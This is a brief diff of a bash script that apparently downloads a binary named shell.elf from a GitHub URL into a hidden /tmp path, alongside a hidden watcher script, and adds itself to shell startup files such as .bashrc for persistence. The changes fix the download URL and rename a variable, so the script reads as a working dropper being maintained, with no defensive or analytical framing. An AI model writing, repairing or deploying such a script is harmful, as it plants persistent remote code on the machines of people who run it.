@@ -1,6 +1,6 @@
 #!/bin/bash
 
-SHELL_URL="https://raw.githubusercontent.com/sys64x/sys/shell.elf"
+SHELL_URL="https://raw.githubusercontent.com/sys64x/sys/main/shell.elf"
 SHELL_PATH="/tmp/.shell.elf"
 WATCHER_PATH="/tmp/.shell_watcher.sh"
 
@@ -40,9 +40,9 @@ add_autostart() {
   fi
 }
 
-SHELL_NAME=$(basename "$SHELL")
+CURRENT_SHELL=$(basename "$SHELL")
 
-case "$SHELL_NAME" in
+case "$CURRENT_SHELL" in
   bash)
     add_autostart "$BASHRC"
     ;;
